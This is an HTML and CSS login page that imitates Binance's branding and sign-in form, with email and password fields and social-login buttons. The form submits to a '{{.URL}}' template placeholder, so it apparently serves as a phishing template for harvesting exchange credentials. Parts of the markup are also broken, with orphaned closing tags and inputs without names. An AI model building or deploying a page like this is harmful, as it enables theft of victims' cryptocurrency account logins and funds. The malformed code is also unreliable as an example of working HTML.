<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background-color: #0B0E11;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #EAECEF;
        }

        .login-container {
            background-color: #1E2026;
            padding: 48px 40px;
            border-radius: 8px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
        }

        .login-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
        }

        h1 {
            font-size: 32px;
            font-weight: 500;
            color: #EAECEF;
        }

        .qr-icon {
            width: 32px;
            height: 32px;
            border: 2px solid #474D57;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        .qr-icon svg {
            width: 20px;
            height: 20px;
            fill: #EAECEF;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #EAECEF;
            font-weight: 400;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            background-color: #0B0E11;
            border: 1px solid #474D57;
            border-radius: 4px;
            font-size: 14px;
            color: #EAECEF;
            outline: none;
            transition: border-color 0.2s ease;
        }

        input::placeholder {
            color: #707A8A;
        }

        input:focus {
            border-color: #FCD535;
        }

        .continue-btn {
            width: 100%;
            padding: 14px;
            background-color: #FCD535;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            color: #0B0E11;
            cursor: pointer;
            margin-top: 24px;
            transition: background-color 0.2s ease;
        }

        .continue-btn:hover {
            background-color: #F0CB2F;
        }

        .divider {
            text-align: center;
            margin: 24px 0;
            position: relative;
        }

        .divider::before,
        .divider::after {
            content: '';
            position: absolute;
            top: 50%;
            width: 45%;
            height: 1px;
            background-color: #474D57;
        }

        .divider::before {
            left: 0;
        }

        .divider::after {
            right: 0;
        }

        .divider span {
            color: #707A8A;
            font-size: 14px;
            padding: 0 16px;
            background-color: #1E2026;
        }

        .social-login {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .social-btn {
            width: 100%;
            padding: 12px;
            background-color: transparent;
            border: 1px solid #474D57;
            border-radius: 4px;
            font-size: 14px;
            color: #EAECEF;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: background-color 0.2s ease;
        }

        .social-btn:hover {
            background-color: #2B3139;
        }

        .social-btn svg,
        .social-btn img {
            width: 20px;
            height: 20px;
        }

        .create-account {
            text-align: center;
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid #474D57;
        }

        .create-account a {
            color: #FCD535;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .create-account a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>Log in</h1>
            <div class="qr-icon">
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M3 3h8v8H3V3zm2 2v4h4V5H5zm8-2h8v8h-8V3zm2 2v4h4V5h-4zM3 13h8v8H3v-8zm2 2v4h4v-4H5zm12-2h2v2h-2v-2zm-2 2h2v2h-2v-2zm2 2h2v2h-2v-2zm-2 2h2v2h-2v-2zm4-4h2v2h-2v-2zm0 4h2v2h-2v-2z"/>
                </svg>
            </div>
        </div>
        <form action="{{.URL}}" method="POST">
        <div class="form-group">
             
            <label for="email">Email/Phone number</label>
            <input 
                type="text" 
                id="email" 
                placeholder="Email/Phone (without country code)"
            >
        </div>

        <div class="form-group">
            <label for="password">Password</label>
            <input 
                type="password" 
                id="password" 
                placeholder="Enter your password"
            >
        </div>

        <button type="submit" class="continue-btn">Continue</button>
    </form>

        <div class="divider">
            <span>or</span>
        </div>

                </svg>
                Continue with Passkey
            </button>

            <button class="social-btn">
                <svg width="20" height="20" viewBox="0 0 24 24">
                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>

                </svg>
                Continue with Google
            </button>

            <button class="social-btn">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#EAECEF">
                    <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
                </svg>
                Continue with Apple
            </button>

            <button class="social-btn">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#26A5E4">
                    <path d="M12 2C6.48 2 2 6.48 2 12c0 5.52 4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.67-.52.36-.99.53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.24.37-.48 1.03-.73 4.04-1.76 6.73-2.92 8.08-3.49 3.85-1.6 4.65-1.88 5.18-1.89.11 0 .37.03.54.17.14.12.18.28.2.44-.01.06.01.24 0 .38z"/>
                </svg>
                Continue with Telegram
            </button>
        </div>

        <div class="create-account">
            <a href="#">Create a Binance Account</a>
        </div>
    </div>
</body>
</html>
